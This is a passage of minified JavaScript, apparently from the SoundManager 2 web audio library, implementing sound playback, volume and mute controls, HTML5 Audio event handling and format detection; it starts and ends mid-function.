                if (c.html5Only ||
                    c.html5.usingFlash && a.url && a.url.match(/data\:/i)) return d();
                8 < m && null === a.isMovieStar && (a.isMovieStar = !!(a.serverURL || a.type && a.type.match(eb) || a.url && a.url.match(kb)));
                a = ga(a, void 0);
                f = d();
                8 === m ? k._createSound(a.id, a.loops || 1, a.usePolicyFile) : (k._createSound(a.id, a.url, a.usePeakData, a.useWaveformData, a.useEQData, a.isMovieStar, a.isMovieStar ? a.bufferTime : !1, a.loops || 1, a.serverURL, a.duration || null, a.autoPlay, !0, a.autoLoad, a.usePolicyFile), a.serverURL || (f.connected = !0, a.onconnect && a.onconnect.apply(f)));
                a.serverURL || !a.autoLoad && !a.autoPlay || f.load(a)
            }!a.serverURL && a.autoPlay && f.play();
            return f
        };
        this.destroySound = function(b, e) {
            if (!q(b)) return !1;
            var d = c.sounds[b],
                a;
            d.stop();
            d._iO = {};
            d.unload();
            for (a = 0; a < c.soundIDs.length; a++)
                if (c.soundIDs[a] === b) {
                    c.soundIDs.splice(a, 1);
                    break
                }
            e || d.destruct(!0);
            delete c.sounds[b];
            return !0
        };
        this.load = function(b, e) {
            return q(b) ? c.sounds[b].load(e) : !1
        };
        this.unload = function(b) {
            return q(b) ? c.sounds[b].unload() : !1
        };
        this.onposition = this.onPosition = function(b, e, d, a) {
            return q(b) ?
                c.sounds[b].onposition(e, d, a) : !1
        };
        this.clearOnPosition = function(b, e, d) {
            return q(b) ? c.sounds[b].clearOnPosition(e, d) : !1
        };
        this.start = this.play = function(b, e) {
            var d = null,
                a = e && !(e instanceof Object);
            if (!l || !c.ok()) return !1;
            if (q(b, a)) a && (e = {
                url: e
            });
            else {
                if (!a) return !1;
                a && (e = {
                    url: e
                });
                e && e.url && (e.id = b, d = c.createSound(e).play())
            }
            null === d && (d = c.sounds[b].play(e));
            return d
        };
        this.setPosition = function(b, e) {
            return q(b) ? c.sounds[b].setPosition(e) : !1
        };
        this.stop = function(b) {
            return q(b) ? c.sounds[b].stop() : !1
        };
        this.stopAll =
            function() {
                for (var b in c.sounds) c.sounds.hasOwnProperty(b) && c.sounds[b].stop()
            };
        this.pause = function(b) {
            return q(b) ? c.sounds[b].pause() : !1
        };
        this.pauseAll = function() {
            var b;
            for (b = c.soundIDs.length - 1; 0 <= b; b--) c.sounds[c.soundIDs[b]].pause()
        };
        this.resume = function(b) {
            return q(b) ? c.sounds[b].resume() : !1
        };
        this.resumeAll = function() {
            var b;
            for (b = c.soundIDs.length - 1; 0 <= b; b--) c.sounds[c.soundIDs[b]].resume()
        };
        this.togglePause = function(b) {
            return q(b) ? c.sounds[b].togglePause() : !1
        };
        this.setPan = function(b, e) {
            return q(b) ?
                c.sounds[b].setPan(e) : !1
        };
        this.setVolume = function(b, e) {
            var d, a;
            if (b === g || isNaN(b) || e !== g) return q(b) ? c.sounds[b].setVolume(e) : !1;
            d = 0;
            for (a = c.soundIDs.length; d < a; d++) c.sounds[c.soundIDs[d]].setVolume(b)
        };
        this.mute = function(b) {
            var e = 0;
            b instanceof String && (b = null);
            if (b) return q(b) ? c.sounds[b].mute() : !1;
            for (e = c.soundIDs.length - 1; 0 <= e; e--) c.sounds[c.soundIDs[e]].mute();
            return c.muted = !0
        };
        this.muteAll = function() {
            c.mute()
        };
        this.unmute = function(b) {
            b instanceof String && (b = null);
            if (b) return q(b) ? c.sounds[b].unmute() :
                !1;
            for (b = c.soundIDs.length - 1; 0 <= b; b--) c.sounds[c.soundIDs[b]].unmute();
            c.muted = !1;
            return !0
        };
        this.unmuteAll = function() {
            c.unmute()
        };
        this.toggleMute = function(b) {
            return q(b) ? c.sounds[b].toggleMute() : !1
        };
        this.getMemoryUse = function() {
            var b = 0;
            k && 8 !== m && (b = parseInt(k._getMemoryUse(), 10));
            return b
        };
        this.disable = function(b) {
            var e;
            b === g && (b = !1);
            if (B) return !1;
            B = !0;
            for (e = c.soundIDs.length - 1; 0 <= e; e--) Ta(c.sounds[c.soundIDs[e]]);
            Q(b);
            t.remove(h, "load", H);
            return !0
        };
        this.canPlayMIME = function(b) {
            var e;
            c.hasHTML5 &&
            (e = Y({
                type: b
            }));
            !e && v && (e = b && c.ok() ? !!(8 < m && b.match(eb) || b.match(c.mimePattern)) : null);
            return e
        };
        this.canPlayURL = function(b) {
            var e;
            c.hasHTML5 && (e = Y({
                url: b
            }));
            !e && v && (e = b && c.ok() ? !!b.match(c.filePattern) : null);
            return e
        };
        this.canPlayLink = function(b) {
            return b.type !== g && b.type && c.canPlayMIME(b.type) ? !0 : c.canPlayURL(b.href)
        };
        this.getSoundById = function(b, e) {
            return b ? c.sounds[b] : null
        };
        this.onready = function(b, c) {
            if ("function" === typeof b) c || (c = h), ta("onready", b, c), F();
            else throw T("needFunction", "onready");
            return !0
        };
        this.ontimeout = function(b, c) {
            if ("function" === typeof b) c || (c = h), ta("ontimeout", b, c), F({
                type: "ontimeout"
            });
            else throw T("needFunction", "ontimeout");
            return !0
        };
        this._wD = this._writeDebug = function(b, c) {
            return !0
        };
        this._debug = function() {};
        this.reboot = function(b, e) {
            var d, a, f;
            for (d = c.soundIDs.length - 1; 0 <= d; d--) c.sounds[c.soundIDs[d]].destruct();
            if (k) try {
                E && (Aa = k.innerHTML), S = k.parentNode.removeChild(k)
            } catch (g) {}
            Aa = S = v = k = null;
            c.enabled = R = l = U = Ca = O = P = B = z = c.swfLoaded = !1;
            c.soundIDs = [];
            c.sounds = {};
            ab =
                0;
            Ga = !1;
            if (b) y = [];
            else
                for (d in y)
                    if (y.hasOwnProperty(d))
                        for (a = 0, f = y[d].length; a < f; a++) y[d][a].fired = !1;
            c.html5 = {
                usingFlash: null
            };
            c.flash = {};
            c.html5Only = !1;
            c.ignoreFlash = !1;
            h.setTimeout(function() {
                e || c.beginDelayedInit()
            }, 20);
            return c
        };
        this.reset = function() {
            return c.reboot(!0, !0)
        };
        this.getMoviePercent = function() {
            return k && "PercentLoaded" in k ? k.PercentLoaded() : null
        };
        this.beginDelayedInit = function() {
            ra = !0;
            G();
            setTimeout(function() {
                if (Ca) return !1;
                ea();
                da();
                return Ca = !0
            }, 20);
            I()
        };
        this.destruct = function() {
            c.disable(!0)
        };
        N = function(b) {
            var e, d, a = this,
                f, n, h, M, p, r, u = !1,
                l = [],
                v = 0,
                y, B, w = null,
                A;
            d = e = null;
            this.sID = this.id = b.id;
            this.url = b.url;
            this._iO = this.instanceOptions = this.options = x(b);
            this.pan = this.options.pan;
            this.volume = this.options.volume;
            this.isHTML5 = !1;
            this._a = null;
            A = this.url ? !1 : !0;
            this.id3 = {};
            this._debug = function() {};
            this.load = function(b) {
                var e = null,
                    d;
                b !== g ? a._iO = x(b, a.options) : (b = a.options, a._iO = b, w && w !== a.url && (a._iO.url = a.url, a.url = null));
                a._iO.url || (a._iO.url = a.url);
                a._iO.url = ia(a._iO.url);
                d = a.instanceOptions =
                    a._iO;
                if (!d.url && !a.url) return a;
                if (d.url === a.url && 0 !== a.readyState && 2 !== a.readyState) return 3 === a.readyState && d.onload && la(a, function() {
                    d.onload.apply(a, [!!a.duration])
                }), a;
                a.loaded = !1;
                a.readyState = 1;
                a.playState = 0;
                a.id3 = {};
                if (ja(d)) e = a._setup_html5(d), e._called_load || (a._html5_canplay = !1, a.url !== d.url && (a._a.src = d.url, a.setPosition(0)), a._a.autobuffer = "auto", a._a.preload = "auto", a._a._called_load = !0);
                else {
                    if (c.html5Only || a._iO.url && a._iO.url.match(/data\:/i)) return a;
                    try {
                        a.isHTML5 = !1, a._iO = ga(fa(d)),
                        a._iO.autoPlay && (a._iO.position || a._iO.from) && (a._iO.autoPlay = !1), d = a._iO, 8 === m ? k._load(a.id, d.url, d.stream, d.autoPlay, d.usePolicyFile) : k._load(a.id, d.url, !!d.stream, !!d.autoPlay, d.loops || 1, !!d.autoLoad, d.usePolicyFile)
                    } catch (f) {
                        K({
                            type: "SMSOUND_LOAD_JS_EXCEPTION",
                            fatal: !0
                        })
                    }
                }
                a.url = d.url;
                return a
            };
            this.unload = function() {
                0 !== a.readyState && (a.isHTML5 ? (M(), a._a && (a._a.pause(), w = ka(a._a))) : 8 === m ? k._unload(a.id, "about:blank") : k._unload(a.id), f());
                return a
            };
            this.destruct = function(b) {
                a.isHTML5 ? (M(), a._a &&
                (a._a.pause(), ka(a._a), z || h(), a._a._s = null, a._a = null)) : (a._iO.onfailure = null, k._destroySound(a.id));
                b || c.destroySound(a.id, !0)
            };
            this.start = this.play = function(b, e) {
                var d, f, n, h, Na;
                f = !0;
                f = null;
                e = e === g ? !0 : e;
                b || (b = {});
                a.url && (a._iO.url = a.url);
                a._iO = x(a._iO, a.options);
                a._iO = x(b, a._iO);
                a._iO.url = ia(a._iO.url);
                a.instanceOptions = a._iO;
                if (!a.isHTML5 && a._iO.serverURL && !a.connected) return a.getAutoPlay() || a.setAutoPlay(!0), a;
                ja(a._iO) && (a._setup_html5(a._iO), p());
                1 !== a.playState || a.paused || (d = a._iO.multiShot,
                d || (a.isHTML5 && a.setPosition(a._iO.position), f = a));
                if (null !== f) return f;
                b.url && b.url !== a.url && (a.readyState || a.isHTML5 || 8 !== m || !A ? a.load(a._iO) : A = !1);
                a.loaded || (0 === a.readyState ? (a.isHTML5 || c.html5Only ? a.isHTML5 ? a.load(a._iO) : f = a : (a._iO.autoPlay = !0, a.load(a._iO)), a.instanceOptions = a._iO) : 2 === a.readyState && (f = a));
                if (null !== f) return f;
                !a.isHTML5 && 9 === m && 0 < a.position && a.position === a.duration && (b.position = 0);
                if (a.paused && 0 <= a.position && (!a._iO.serverURL || 0 < a.position)) a.resume();
                else {
                    a._iO = x(b, a._iO);
                    if ((!a.isHTML5 && null !== a._iO.position && 0 < a._iO.position || null !== a._iO.from && 0 < a._iO.from || null !== a._iO.to) && 0 === a.instanceCount && 0 === a.playState && !a._iO.serverURL) {
                        d = function() {
                            a._iO = x(b, a._iO);
                            a.play(a._iO)
                        };
                        a.isHTML5 && !a._html5_canplay ? (a.load({
                            _oncanplay: d
                        }), f = !1) : a.isHTML5 || a.loaded || a.readyState && 2 === a.readyState || (a.load({
                            onload: d
                        }), f = !1);
                        if (null !== f) return f;
                        a._iO = B()
                    }(!a.instanceCount || a._iO.multiShotEvents || a.isHTML5 && a._iO.multiShot && !z || !a.isHTML5 && 8 < m && !a.getAutoPlay()) && a.instanceCount++;
                    a._iO.onposition && 0 === a.playState && r(a);
                    a.playState = 1;
                    a.paused = !1;
                    a.position = a._iO.position === g || isNaN(a._iO.position) ? 0 : a._iO.position;
                    a.isHTML5 || (a._iO = ga(fa(a._iO)));
                    a._iO.onplay && e && (a._iO.onplay.apply(a), u = !0);
                    a.setVolume(a._iO.volume, !0);
                    a.setPan(a._iO.pan, !0);
                    a.isHTML5 ? 2 > a.instanceCount ? (p(), f = a._setup_html5(), a.setPosition(a._iO.position), f.play()) : (n = new Audio(a._iO.url), h = function() {
                        t.remove(n, "ended", h);
                        a._onfinish(a);
                        ka(n);
                        n = null
                    }, Na = function() {
                        t.remove(n, "canplay", Na);
                        try {
                            n.currentTime =
                                a._iO.position / 1E3
                        } catch (b) {}
                        n.play()
                    }, t.add(n, "ended", h), a._iO.volume !== g && (n.volume = Math.max(0, Math.min(1, a._iO.volume / 100))), a.muted && (n.muted = !0), a._iO.position ? t.add(n, "canplay", Na) : n.play()) : (f = k._start(a.id, a._iO.loops || 1, 9 === m ? a.position : a.position / 1E3, a._iO.multiShot || !1), 9 !== m || f || a._iO.onplayerror && a._iO.onplayerror.apply(a))
                }
                return a
            };
            this.stop = function(b) {
                var c = a._iO;
                1 === a.playState && (a._onbufferchange(0), a._resetOnPosition(0), a.paused = !1, a.isHTML5 || (a.playState = 0), y(), c.to && a.clearOnPosition(c.to),
                    a.isHTML5 ? a._a && (b = a.position, a.setPosition(0), a.position = b, a._a.pause(), a.playState = 0, a._onTimer(), M()) : (k._stop(a.id, b), c.serverURL && a.unload()), a.instanceCount = 0, a._iO = {}, c.onstop && c.onstop.apply(a));
                return a
            };
            this.setAutoPlay = function(b) {
                a._iO.autoPlay = b;
                a.isHTML5 || (k._setAutoPlay(a.id, b), b && (a.instanceCount || 1 !== a.readyState || a.instanceCount++))
            };
            this.getAutoPlay = function() {
                return a._iO.autoPlay
            };
            this.setPosition = function(b) {
                b === g && (b = 0);
                var c = a.isHTML5 ? Math.max(b, 0) : Math.min(a.duration || a._iO.duration,
                    Math.max(b, 0));
                a.position = c;
                b = a.position / 1E3;
                a._resetOnPosition(a.position);
                a._iO.position = c;
                if (!a.isHTML5) b = 9 === m ? a.position : b, a.readyState && 2 !== a.readyState && k._setPosition(a.id, b, a.paused || !a.playState, a._iO.multiShot);
                else if (a._a) {
                    if (a._html5_canplay) {
                        if (a._a.currentTime !== b) try {
                            a._a.currentTime = b, (0 === a.playState || a.paused) && a._a.pause()
                        } catch (e) {}
                    } else if (b) return a;
                    a.paused && a._onTimer(!0)
                }
                return a
            };
            this.pause = function(b) {
                if (a.paused || 0 === a.playState && 1 !== a.readyState) return a;
                a.paused = !0;
                a.isHTML5 ? (a._setup_html5().pause(), M()) : (b || b === g) && k._pause(a.id, a._iO.multiShot);
                a._iO.onpause && a._iO.onpause.apply(a);
                return a
            };
            this.resume = function() {
                var b = a._iO;
                if (!a.paused) return a;
                a.paused = !1;
                a.playState = 1;
                a.isHTML5 ? (a._setup_html5().play(), p()) : (b.isMovieStar && !b.serverURL && a.setPosition(a.position), k._pause(a.id, b.multiShot));
                !u && b.onplay ? (b.onplay.apply(a), u = !0) : b.onresume && b.onresume.apply(a);
                return a
            };
            this.togglePause = function() {
                if (0 === a.playState) return a.play({
                    position: 9 !== m || a.isHTML5 ?
                    a.position / 1E3 : a.position
                }), a;
                a.paused ? a.resume() : a.pause();
                return a
            };
            this.setPan = function(b, c) {
                b === g && (b = 0);
                c === g && (c = !1);
                a.isHTML5 || k._setPan(a.id, b);
                a._iO.pan = b;
                c || (a.pan = b, a.options.pan = b);
                return a
            };
            this.setVolume = function(b, e) {
                b === g && (b = 100);
                e === g && (e = !1);
                a.isHTML5 ? a._a && (c.muted && !a.muted && (a.muted = !0, a._a.muted = !0), a._a.volume = Math.max(0, Math.min(1, b / 100))) : k._setVolume(a.id, c.muted && !a.muted || a.muted ? 0 : b);
                a._iO.volume = b;
                e || (a.volume = b, a.options.volume = b);
                return a
            };
            this.mute = function() {
                a.muted = !0;
                a.isHTML5 ? a._a && (a._a.muted = !0) : k._setVolume(a.id, 0);
                return a
            };
            this.unmute = function() {
                a.muted = !1;
                var b = a._iO.volume !== g;
                a.isHTML5 ? a._a && (a._a.muted = !1) : k._setVolume(a.id, b ? a._iO.volume : a.options.volume);
                return a
            };
            this.toggleMute = function() {
                return a.muted ? a.unmute() : a.mute()
            };
            this.onposition = this.onPosition = function(b, c, e) {
                l.push({
                    position: parseInt(b, 10),
                    method: c,
                    scope: e !== g ? e : a,
                    fired: !1
                });
                return a
            };
            this.clearOnPosition = function(a, b) {
                var c;
                a = parseInt(a, 10);
                if (isNaN(a)) return !1;
                for (c = 0; c < l.length; c++) a !==
                l[c].position || b && b !== l[c].method || (l[c].fired && v--, l.splice(c, 1))
            };
            this._processOnPosition = function() {
                var b, c;
                b = l.length;
                if (!b || !a.playState || v >= b) return !1;
                for (--b; 0 <= b; b--) c = l[b], !c.fired && a.position >= c.position && (c.fired = !0, v++, c.method.apply(c.scope, [c.position]));
                return !0
            };
            this._resetOnPosition = function(a) {
                var b, c;
                b = l.length;
                if (!b) return !1;
                for (--b; 0 <= b; b--) c = l[b], c.fired && a <= c.position && (c.fired = !1, v--);
                return !0
            };
            B = function() {
                var b = a._iO,
                    c = b.from,
                    e = b.to,
                    d, f;
                f = function() {
                    a.clearOnPosition(e, f);
                    a.stop()
                };
                d = function() {
                    if (null !== e && !isNaN(e)) a.onPosition(e, f)
                };
                null === c || isNaN(c) || (b.position = c, b.multiShot = !1, d());
                return b
            };
            r = function() {
                var b, c = a._iO.onposition;
                if (c)
                    for (b in c)
                        if (c.hasOwnProperty(b)) a.onPosition(parseInt(b, 10), c[b])
            };
            y = function() {
                var b, c = a._iO.onposition;
                if (c)
                    for (b in c) c.hasOwnProperty(b) && a.clearOnPosition(parseInt(b, 10))
            };
            p = function() {
                a.isHTML5 && Va(a)
            };
            M = function() {
                a.isHTML5 && Wa(a)
            };
            f = function(b) {
                b || (l = [], v = 0);
                u = !1;
                a._hasTimer = null;
                a._a = null;
                a._html5_canplay = !1;
                a.bytesLoaded =
                    null;
                a.bytesTotal = null;
                a.duration = a._iO && a._iO.duration ? a._iO.duration : null;
                a.durationEstimate = null;
                a.buffered = [];
                a.eqData = [];
                a.eqData.left = [];
                a.eqData.right = [];
                a.failures = 0;
                a.isBuffering = !1;
                a.instanceOptions = {};
                a.instanceCount = 0;
                a.loaded = !1;
                a.metadata = {};
                a.readyState = 0;
                a.muted = !1;
                a.paused = !1;
                a.peakData = {
                    left: 0,
                    right: 0
                };
                a.waveformData = {
                    left: [],
                    right: []
                };
                a.playState = 0;
                a.position = null;
                a.id3 = {}
            };
            f();
            this._onTimer = function(b) {
                var c, f = !1,
                    g = {};
                if (a._hasTimer || b) return a._a && (b || (0 < a.playState || 1 === a.readyState) &&
                !a.paused) && (c = a._get_html5_duration(), c !== e && (e = c, a.duration = c, f = !0), a.durationEstimate = a.duration, c = 1E3 * a._a.currentTime || 0, c !== d && (d = c, f = !0), (f || b) && a._whileplaying(c, g, g, g, g)), f
            };
            this._get_html5_duration = function() {
                var b = a._iO;
                return (b = a._a && a._a.duration ? 1E3 * a._a.duration : b && b.duration ? b.duration : null) && !isNaN(b) && Infinity !== b ? b : null
            };
            this._apply_loop = function(a, b) {
                a.loop = 1 < b ? "loop" : ""
            };
            this._setup_html5 = function(b) {
                b = x(a._iO, b);
                var c = z ? Oa : a._a,
                    e = decodeURI(b.url),
                    d;
                z ? e === decodeURI(Ea) && (d = !0) :
                e === decodeURI(w) && (d = !0);
                if (c) {
                    if (c._s)
                        if (z) c._s && c._s.playState && !d && c._s.stop();
                        else if (!z && e === decodeURI(w)) return a._apply_loop(c, b.loops), c;
                    d || (w && f(!1), c.src = b.url, Ea = w = a.url = b.url, c._called_load = !1)
                } else b.autoLoad || b.autoPlay ? (a._a = new Audio(b.url), a._a.load()) : a._a = Ja && 10 > opera.version() ? new Audio(null) : new Audio, c = a._a, c._called_load = !1, z && (Oa = c);
                a.isHTML5 = !0;
                a._a = c;
                c._s = a;
                n();
                a._apply_loop(c, b.loops);
                b.autoLoad || b.autoPlay ? a.load() : (c.autobuffer = !1, c.preload = "auto");
                return c
            };
            n = function() {
                if (a._a._added_events) return !1;
                var b;
                a._a._added_events = !0;
                for (b in C) C.hasOwnProperty(b) && a._a && a._a.addEventListener(b, C[b], !1);
                return !0
            };
            h = function() {
                var b;
                a._a._added_events = !1;
                for (b in C) C.hasOwnProperty(b) && a._a && a._a.removeEventListener(b, C[b], !1)
            };
            this._onload = function(b) {
                var c = !!b || !a.isHTML5 && 8 === m && a.duration;
                a.loaded = c;
                a.readyState = c ? 3 : 2;
                a._onbufferchange(0);
                a._iO.onload && la(a, function() {
                    a._iO.onload.apply(a, [c])
                });
                return !0
            };
            this._onbufferchange = function(b) {
                if (0 === a.playState || b && a.isBuffering || !b && !a.isBuffering) return !1;
                a.isBuffering = 1 === b;
                a._iO.onbufferchange && a._iO.onbufferchange.apply(a, [b]);
                return !0
            };
            this._onsuspend = function() {
                a._iO.onsuspend && a._iO.onsuspend.apply(a);
                return !0
            };
            this._onfailure = function(b, c, e) {
                a.failures++;
                if (a._iO.onfailure && 1 === a.failures) a._iO.onfailure(b, c, e)
            };
            this._onwarning = function(b, c, e) {
                if (a._iO.onwarning) a._iO.onwarning(b, c, e)
            };
            this._onfinish = function() {
                var b = a._iO.onfinish;
                a._onbufferchange(0);
                a._resetOnPosition(0);
                a.instanceCount && (a.instanceCount--, a.instanceCount || (y(), a.playState =
                    0, a.paused = !1, a.instanceCount = 0, a.instanceOptions = {}, a._iO = {}, M(), a.isHTML5 && (a.position = 0)), (!a.instanceCount || a._iO.multiShotEvents) && b && la(a, function() {
                    b.apply(a)
                }))
            };
            this._whileloading = function(b, c, e, d) {
                var f = a._iO;
                a.bytesLoaded = b;
                a.bytesTotal = c;
                a.duration = Math.floor(e);
                a.bufferLength = d;
                a.durationEstimate = a.isHTML5 || f.isMovieStar ? a.duration : f.duration ? a.duration > f.duration ? a.duration : f.duration : parseInt(a.bytesTotal / a.bytesLoaded * a.duration, 10);
                a.isHTML5 || (a.buffered = [{
                    start: 0,
                    end: a.duration
                }]);
                (3 !== a.readyState || a.isHTML5) && f.whileloading && f.whileloading.apply(a)
            };
            this._whileplaying = function(b, c, e, d, f) {
                var n = a._iO;
                if (isNaN(b) || null === b) return !1;
                a.position = Math.max(0, b);
                a._processOnPosition();
                !a.isHTML5 && 8 < m && (n.usePeakData && c !== g && c && (a.peakData = {
                    left: c.leftPeak,
                    right: c.rightPeak
                }), n.useWaveformData && e !== g && e && (a.waveformData = {
                    left: e.split(","),
                    right: d.split(",")
                }), n.useEQData && f !== g && f && f.leftEQ && (b = f.leftEQ.split(","), a.eqData = b, a.eqData.left = b, f.rightEQ !== g && f.rightEQ && (a.eqData.right =
                    f.rightEQ.split(","))));
                1 === a.playState && (a.isHTML5 || 8 !== m || a.position || !a.isBuffering || a._onbufferchange(0), n.whileplaying && n.whileplaying.apply(a));
                return !0
            };
            this._oncaptiondata = function(b) {
                a.captiondata = b;
                a._iO.oncaptiondata && a._iO.oncaptiondata.apply(a, [b])
            };
            this._onmetadata = function(b, c) {
                var e = {},
                    d, f;
                d = 0;
                for (f = b.length; d < f; d++) e[b[d]] = c[d];
                a.metadata = e;
                a._iO.onmetadata && a._iO.onmetadata.call(a, a.metadata)
            };
            this._onid3 = function(b, c) {
                var e = [],
                    d, f;
                d = 0;
                for (f = b.length; d < f; d++) e[b[d]] = c[d];
                a.id3 = x(a.id3,
                    e);
                a._iO.onid3 && a._iO.onid3.apply(a)
            };
            this._onconnect = function(b) {
                b = 1 === b;
                if (a.connected = b) a.failures = 0, q(a.id) && (a.getAutoPlay() ? a.play(g, a.getAutoPlay()) : a._iO.autoLoad && a.load()), a._iO.onconnect && a._iO.onconnect.apply(a, [b])
            };
            this._ondataerror = function(b) {
                0 < a.playState && a._iO.ondataerror && a._iO.ondataerror.apply(a)
            }
        };
        xa = function() {
            return p.body || p.getElementsByTagName("div")[0]
        };
        aa = function(b) {
            return p.getElementById(b)
        };
        x = function(b, e) {
            var d = b || {},
                a, f;
            a = e === g ? c.defaultOptions : e;
            for (f in a) a.hasOwnProperty(f) &&
            d[f] === g && (d[f] = "object" !== typeof a[f] || null === a[f] ? a[f] : x(d[f], a[f]));
            return d
        };
        la = function(b, c) {
            b.isHTML5 || 8 !== m ? c() : h.setTimeout(c, 0)
        };
        ba = {
            onready: 1,
            ontimeout: 1,
            defaultOptions: 1,
            flash9Options: 1,
            movieStarOptions: 1
        };
        sa = function(b, e) {
            var d, a = !0,
                f = e !== g,
                n = c.setupOptions;
            for (d in b)
                if (b.hasOwnProperty(d))
                    if ("object" !== typeof b[d] || null === b[d] || b[d] instanceof Array || b[d] instanceof RegExp) f && ba[e] !== g ? c[e][d] = b[d] : n[d] !== g ? (c.setupOptions[d] = b[d], c[d] = b[d]) : ba[d] === g ? a = !1 : c[d] instanceof Function ? c[d].apply(c,
                        b[d] instanceof Array ? b[d] : [b[d]]) : c[d] = b[d];
                    else if (ba[d] === g) a = !1;
                    else return sa(b[d], d);
            return a
        };
        t = function() {
            function b(a) {
                a = hb.call(a);
                var b = a.length;
                d ? (a[1] = "on" + a[1], 3 < b && a.pop()) : 3 === b && a.push(!1);
                return a
            }

            function c(b, e) {
                var g = b.shift(),
                    h = [a[e]];
                if (d) g[h](b[0], b[1]);
                else g[h].apply(g, b)
            }
            var d = h.attachEvent,
                a = {
                    add: d ? "attachEvent" : "addEventListener",
                    remove: d ? "detachEvent" : "removeEventListener"
                };
            return {
                add: function() {
                    c(b(arguments), "add")
                },
                remove: function() {
                    c(b(arguments), "remove")
                }
            }
        }();
        C = {
            abort: r(function() {}),
            canplay: r(function() {
                var b = this._s,
                    c;
                if (b._html5_canplay) return !0;
                b._html5_canplay = !0;
                b._onbufferchange(0);
                c = b._iO.position === g || isNaN(b._iO.position) ? null : b._iO.position / 1E3;
                if (this.currentTime !== c) try {
                    this.currentTime = c
                } catch (d) {}
                b._iO._oncanplay && b._iO._oncanplay()
            }),
            canplaythrough: r(function() {
                var b = this._s;
                b.loaded || (b._onbufferchange(0), b._whileloading(b.bytesLoaded, b.bytesTotal, b._get_html5_duration()), b._onload(!0))
            }),
            durationchange: r(function() {
                var b = this._s,
                    c;
                c = b._get_html5_duration();
                isNaN(c) ||
                c === b.duration || (b.durationEstimate = b.duration = c)
            }),
            ended: r(function() {
                this._s._onfinish()
            }),
            error: r(function() {
                this._s._onload(!1)
            }),
            loadeddata: r(function() {
                var b = this._s;
                b._loaded || ma || (b.duration = b._get_html5_duration())
            }),
            loadedmetadata: r(function() {}),
            loadstart: r(function() {
                this._s._onbufferchange(1)
            }),
            play: r(function() {
                this._s._onbufferchange(0)
            }),
            playing: r(function() {
                this._s._onbufferchange(0)
            }),
            progress: r(function(b) {
                var c = this._s,
                    d, a, f = 0,
                    f = b.target.buffered;
                d = b.loaded || 0;
                var g = b.total || 1;
                c.buffered = [];
                if (f && f.length) {
                    d = 0;
                    for (a = f.length; d < a; d++) c.buffered.push({
                        start: 1E3 * f.start(d),
                        end: 1E3 * f.end(d)
                    });
                    f = 1E3 * (f.end(0) - f.start(0));
                    d = Math.min(1, f / (1E3 * b.target.duration))
                }
                isNaN(d) || (c._whileloading(d, g, c._get_html5_duration()), d && g && d === g && C.canplaythrough.call(this, b))
            }),
            ratechange: r(function() {}),
            suspend: r(function(b) {
                var c = this._s;
                C.progress.call(this, b);
                c._onsuspend()
            }),
            stalled: r(function() {}),
            timeupdate: r(function() {
                this._s._onTimer()
            }),
            waiting: r(function() {
                this._s._onbufferchange(1)
            })
        };
        ja = function(b) {
            return b && (b.type || b.url || b.serverURL) ? b.serverURL || b.type && Z(b.type) ? !1 : b.type ? Y({
                type: b.type
            }) : Y({
                url: b.url
            }) || c.html5Only || b.url.match(/data\:/i) : !1
        };
        ka = function(b) {
            var e;
            b && (e = ma ? "about:blank" : c.html5.canPlayType("audio/wav") ? "data:audio/wave;base64,/UklGRiYAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQIAAAD//w==" : "about:blank", b.src = e, b._called_unload !== g && (b._called_load = !1));
            z && (Ea = null);
            return e
        };
        Y = function(b) {
            if (!c.useHTML5Audio || !c.hasHTML5) return !1;
            var e = b.url || null;
            b = b.type ||
                null;
            var d = c.audioFormats,
                a;
            if (b && c.html5[b] !== g) return c.html5[b] && !Z(b);
            if (!D) {
                D = [];
                for (a in d) d.hasOwnProperty(a) && (D.push(a), d[a].related && (D = D.concat(d[a].related)));
                D = new RegExp("\\.(" + D.join("|") + ")(\\?.*)?$", "i")
            }(a = e ? e.toLowerCase().match(D) : null) && a.length ? a = a[1] : b && (e = b.indexOf(";"), a = (-1 !== e ? b.substr(0, e) : b).substr(6));
            a && c.html5[a] !== g ? e = c.html5[a] && !Z(a) : (b = "audio/" + a, e = c.html5.canPlayType({
                type: b
            }), e = (c.html5[a] = e) && c.html5[b] && !Z(b));
            return e
        };
        Za = function() {
            function b(a) {
                var b, d = b = !1;
                if (!e || "function" !== typeof e.canPlayType) return b;
                if (a instanceof Array) {
                    h = 0;
                    for (b = a.length; h < b; h++)
                        if (c.html5[a[h]] || e.canPlayType(a[h]).match(c.html5Test)) d = !0, c.html5[a[h]] = !0, c.flash[a[h]] = !!a[h].match(db);
                    b = d
                } else a = e && "function" === typeof e.canPlayType ? e.canPlayType(a) : !1, b = !(!a || !a.match(c.html5Test));
                return b
            }
            if (!c.useHTML5Audio || !c.hasHTML5) return v = c.html5.usingFlash = !0, !1;
            var e = Audio !== g ? Ja && 10 > opera.version() ? new Audio(null) : new Audio : null,
                d, a, f = {},
                n, h;
            n = c.audioFormats;
            for (d in n)
                if (n.hasOwnProperty(d) &&
                    (a = "audio/" + d, f[d] = b(n[d].type), f[a] = f[d], d.match(db) ? (c.flash[d] = !0, c.flash[a] = !0) : (c.flash[d] = !1, c.flash[a] = !1), n[d] && n[d].related))
                    for (h = n[d].related.length - 1; 0 <= h; h--) f["audio/" + n[d].related[h]] = f[d], c.html5[n[d].related[h]] = f[d], c.flash[n[d].related[h]] = f[d];
            f.canPlayType = e ? b : null;
            c.html5 = x(c.html5, f);
            c.html5.usingFlash = Ya();
            v = c.html5.usingFlash;
            return !0
        };
        J = {};
        T = function() {};
        fa = function(b) {
            8 === m && 1 < b.loops && b.stream && (b.stream = !1);
            return b
        };
        ga = function(b, c) {
            b && !b.usePolicyFile && (b.onid3 || b.usePeakData ||
            b.useWaveformData || b.useEQData) && (b.usePolicyFile = !0);
            return b
        };
        pa = function() {
            return !1
        };
        Ta = function(b) {
            for (var c in b) b.hasOwnProperty(c) && "function" === typeof b[c] && (b[c] = pa)
        };
        za = function(b) {
            b === g && (b = !1);
            (B || b) && c.disable(b)
        };
        Ua = function(b) {
            var e = null;
            if (b)
                if (b.match(/\.swf(\?.*)?$/i)) {
                    if (e = b.substr(b.toLowerCase().lastIndexOf(".swf?") + 4)) return b
                } else b.lastIndexOf("/") !== b.length - 1 && (b += "/");
            b = (b && -1 !== b.lastIndexOf("/") ? b.substr(0, b.lastIndexOf("/") + 1) : "./") + c.movieURL;
            c.noSWFCache && (b += "?ts=" +
                (new Date).getTime());
            return b
        };
        va = function() {
            m = parseInt(c.flashVersion, 10);
